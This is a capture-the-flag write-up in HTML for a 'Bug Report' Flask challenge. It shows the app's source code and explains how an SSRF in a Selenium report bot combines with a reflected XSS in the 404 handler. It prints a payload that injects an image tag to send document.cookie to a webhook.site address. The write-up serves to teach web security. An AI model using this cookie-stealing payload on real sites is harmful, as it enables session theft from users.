@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bug Report</title>
+    <link type="text/css" href="/css/markdown.css" rel="stylesheet">
+    <link type="text/css" href="/css/nav.css" rel="stylesheet">
+    <link rel="icon" href="/favicon.ico">
+</head>
+
+<body id="preview">
+    <div style="padding-bottom: 40px;">
+        <nav id="load-navbar"></nav>
+        <br />
+        <br />
+        <hr />    
+    </div>
+
+    <div id="tags">
+        <h5>Tags</h5>
+        <ul>
+            <li>Flask</li>
+            <li>SSRF</li>
+            <li>XSS</li>
+            <li>Selenium</li>
+            <li>webhook</li>
+        </ul>
+    </div>
+
+    <h1 class="code-line" data-line-start=0 data-line-end=1><a id="Bug_Report_0"></a>Bug Report</h1>
+<h2 class="code-line" data-line-start=1 data-line-end=2><a id="Description_1"></a>Description</h2>
+<p class="has-line-data" data-line-start="2" data-line-end="3">They say humans shall not take control to any of their resources. Can you prove them wrong without letting them know.</p>
+<h2 class="code-line" data-line-start=4 data-line-end=5><a id="Files_4"></a>Files</h2>
+<p class="has-line-data" data-line-start="5" data-line-end="6">Provided docker environment.</p>
+<h2 class="code-line" data-line-start=7 data-line-end=8><a id="Code_7"></a>Code</h2>
+<p class="has-line-data" data-line-start="8" data-line-end="9">This is a Flask webapp, with the relevant source code files.</p>
+<h3 class="code-line" data-line-start=10 data-line-end=11><a id="apppy_10"></a><code>app.py</code></h3>
+<pre><code class="has-line-data" data-line-start="12" data-line-end="41" class="language-python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote
+<span class="hljs-keyword">from</span> bot <span class="hljs-keyword">import</span> visit_report
+
+app = Flask(__name__)
+
+<span class="hljs-decorator">@app.route("/")</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">"index.html"</span>)
+
+<span class="hljs-decorator">@app.route("/api/submit", methods=["POST"])</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span><span class="hljs-params">()</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        url = request.json.get(<span class="hljs-string">"url"</span>)
+        
+        <span class="hljs-keyword">assert</span>(url.startswith(<span class="hljs-string">'http://'</span>) <span class="hljs-keyword">or</span> url.startswith(<span class="hljs-string">'https://'</span>))
+        visit_report(url)
+
+        <span class="hljs-keyword">return</span> {<span class="hljs-string">"success"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"Thank you for your valuable submition!"</span>}
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> {<span class="hljs-string">"failure"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"message"</span>: <span class="hljs-string">"Something went wrong."</span>}
+
+
+<span class="hljs-decorator">@app.errorhandler(404)</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span><span class="hljs-params">(error)</span>:</span> 
+    <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;h1&gt;URL %s not found&lt;/h1&gt;&lt;br/&gt;"</span> % unquote(request.url), <span class="hljs-number">404</span>
+
+app.run(host=<span class="hljs-string">"0.0.0.0"</span>, port=<span class="hljs-number">1337</span>)
+</code></pre>
+<h3 class="code-line" data-line-start=42 data-line-end=43><a id="botpy_42"></a><code>bot.py</code></h3>
+<pre><code class="has-line-data" data-line-start="44" data-line-end="87" class="language-python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver
+<span class="hljs-keyword">from</span> selenium.webdriver.chrome.options <span class="hljs-keyword">import</span> Options
+<span class="hljs-keyword">from</span> selenium.webdriver.support.ui <span class="hljs-keyword">import</span> WebDriverWait
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">visit_report</span><span class="hljs-params">(url)</span>:</span>
+
+   options = Options()
+   options.add_argument(<span class="hljs-string">'headless'</span>)
+   options.add_argument(<span class="hljs-string">'no-sandbox'</span>)
+   options.add_argument(<span class="hljs-string">'disable-dev-shm-usage'</span>)
+   options.add_argument(<span class="hljs-string">'disable-infobars'</span>)
+   options.add_argument(<span class="hljs-string">'disable-background-networking'</span>)
+   options.add_argument(<span class="hljs-string">'disable-default-apps'</span>)
+   options.add_argument(<span class="hljs-string">'disable-extensions'</span>)
+   options.add_argument(<span class="hljs-string">'disable-gpu'</span>)
+   options.add_argument(<span class="hljs-string">'disable-sync'</span>)
+   options.add_argument(<span class="hljs-string">'disable-translate'</span>)
+   options.add_argument(<span class="hljs-string">'hide-scrollbars'</span>)
+   options.add_argument(<span class="hljs-string">'metrics-recording-only'</span>)
+   options.add_argument(<span class="hljs-string">'mute-audio'</span>)
+   options.add_argument(<span class="hljs-string">'no-first-run'</span>)
+   options.add_argument(<span class="hljs-string">'dns-prefetch-disable'</span>)
+   options.add_argument(<span class="hljs-string">'safebrowsing-disable-auto-update'</span>)
+   options.add_argument(<span class="hljs-string">'media-cache-size=1'</span>)
+   options.add_argument(<span class="hljs-string">'disk-cache-size=1'</span>)
+   options.add_argument(<span class="hljs-string">'user-agent=BugHTB/1.0'</span>)
+   browser = webdriver.Chrome(<span class="hljs-string">'chromedriver'</span>, options=options, service_args=[<span class="hljs-string">'--verbose'</span>, <span class="hljs-string">'--log-path=/tmp/chromedriver.log'</span>])
+
+   browser.get(<span class="hljs-string">'http://127.0.0.1:1337/'</span>)
+
+   browser.add_cookie({
+       <span class="hljs-string">'name'</span>: <span class="hljs-string">'flag'</span>,
+       <span class="hljs-string">'value'</span>: <span class="hljs-string">'CHTB{f4k3_fl4g_f0r_t3st1ng}'</span>
+   })
+
+   <span class="hljs-keyword">try</span>:
+       browser.get(url)
+       WebDriverWait(browser, <span class="hljs-number">5</span>).until(<span class="hljs-keyword">lambda</span> r: r.execute_script(<span class="hljs-string">'return document.readyState'</span>) == <span class="hljs-string">'complete'</span>)
+   <span class="hljs-keyword">except</span>:
+       <span class="hljs-keyword">pass</span>
+   <span class="hljs-keyword">finally</span>:
+       browser.quit()
+</code></pre>
+<h2 class="code-line" data-line-start=88 data-line-end=89><a id="Methodology_88"></a>Methodology</h2>
+<h3 class="code-line" data-line-start=89 data-line-end=90><a id="SSRF_89"></a>SSRF</h3>
+<p class="has-line-data" data-line-start="90" data-line-end="91">With <code>/api/submit</code> endpoint, we can make the app do an <code>HTTP</code> request. We can see that <code>bot.py</code> uses a headless chrome browser to first call <code>http://127.0.0.1:1337/</code> and add the flag to the cookie, but only for that domain. After that, our request is sent. We can create a custom endpoint using <code>https://webhook.site</code> and request this endpoint from the app.</p>
+<p class="has-line-data" data-line-start="92" data-line-end="93"><img src="./burp.PNG" alt="burp"></p>
+<p class="has-line-data" data-line-start="94" data-line-end="95">And watch the webhook.</p>
+<p class="has-line-data" data-line-start="96" data-line-end="97"><img src="./hook1.PNG" alt="hook+"></p>
+<p class="has-line-data" data-line-start="98" data-line-end="99">We get a hit.</p>
+<h3 class="code-line" data-line-start=100 data-line-end=101><a id="XSS_100"></a>XSS</h3>
+<p class="has-line-data" data-line-start="101" data-line-end="102">We can see in <code>app.py</code> that in the <code>404</code> handler, there is an <code>XSS</code>. Whatever we put in <code>url</code> will get reflected in browser. We are going to use this later.</p>
+<p class="has-line-data" data-line-start="103" data-line-end="104"><img src="./xss.PNG" alt="xss"></p>
+<h2 class="code-line" data-line-start=105 data-line-end=106><a id="Exploit_105"></a>Exploit</h2>
+<p class="has-line-data" data-line-start="106" data-line-end="107">First idea would be to send a request to a remote endpoint, using <code>https://webhook.site</code> and grab the <code>document.cookie</code>, but that doesn’t work because the cookie is only stored for the domain <code>127.0.0.1</code>. Since we have the <code>XSS</code>, we can send a request for <code>127.0.0.1</code> and use the <code>XSS</code> (within the domain of <code>127.0.0.1</code>) to grab the cookie and send it to our remote endpoint. Effectively, we are using the <code>SSRF</code> to make the server do the request to itself.</p>
+<h2 class="code-line" data-line-start=108 data-line-end=109><a id="Payload_108"></a>Payload</h2>
+<pre><code class="has-line-data" data-line-start="110" data-line-end="112">http://127.0.0.1:1337/&lt;script&gt;document.write(&quot;&lt;img src=x onerror=this.src='https://webhook.site/f769c238-a3f1-412e-90ed-f31a2031bbd5/?asdf='+document.cookie&gt;&quot;)&lt;/script&gt;
+</code></pre>
+<p class="has-line-data" data-line-start="113" data-line-end="114">Here, we are injecting an image tag to the <code>DOM</code> and using the <code>src</code> error to send the cookie as a <code>GET</code> parameter with our remote endpoint (a simple fetch would also do the job :D).</p>
+<p class="has-line-data" data-line-start="115" data-line-end="116">We send this crafted string to the report form on the website and wait for the hit on our remote endpoint.</p>
+<h2 class="code-line" data-line-start=117 data-line-end=118><a id="Loot_117"></a>Loot</h2>
+<p class="has-line-data" data-line-start="119" data-line-end="120"><img src="./hook2.PNG" alt="hookľ"></p>
+<h2 class="code-line" data-line-start=121 data-line-end=122><a id="Flag_121"></a>Flag</h2>
+<p class="has-line-data" data-line-start="122" data-line-end="123"><strong>CHTB{th1s_1s_my_bug_r3p0rt}</strong></p>
+
+    <script src="/js/navbar.js"></script>
+</body>
+
+</html>
